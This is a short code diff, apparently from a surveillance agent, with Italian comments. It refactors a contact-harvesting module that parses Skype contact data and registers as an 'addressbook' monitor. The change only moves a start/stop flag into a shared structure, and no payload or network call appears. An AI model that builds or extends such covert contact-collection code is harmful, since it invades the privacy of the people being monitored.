@@ -120,7 +120,7 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 	HANDLE hfile;
 
 	// Se il monitor e' stoppato non esegue la funzione di dispatch
-	if (!bPM_ContactsStarted)
+	if (!shared.bPM_ContactsStarted)
 		return 0;
 
 	// Parsa il messaggio di skype con tutti i contatti
@@ -213,10 +213,10 @@ DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 
 	// Se l'agent e' gia' nella condizione desiderata
 	// non fa nulla.
-	if (bPM_ContactsStarted == bStartFlag)
+	if (shared.bPM_ContactsStarted == bStartFlag)
 		return 0;
 
-	bPM_ContactsStarted = bStartFlag;
+	shared.bPM_ContactsStarted = bStartFlag;
 
 	if (bStartFlag) {
 		// Se e' stato startato esplicitamente, ricomincia catturando
@@ -249,6 +249,6 @@ DWORD __stdcall PM_ContactsInit(JSONObject elem)
 
 void PM_ContactsRegister()
 {
-	bPM_ContactsStarted = FALSE;
+	shared.bPM_ContactsStarted = FALSE;
 	AM_MonitorRegister(L"addressbook", PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
 }
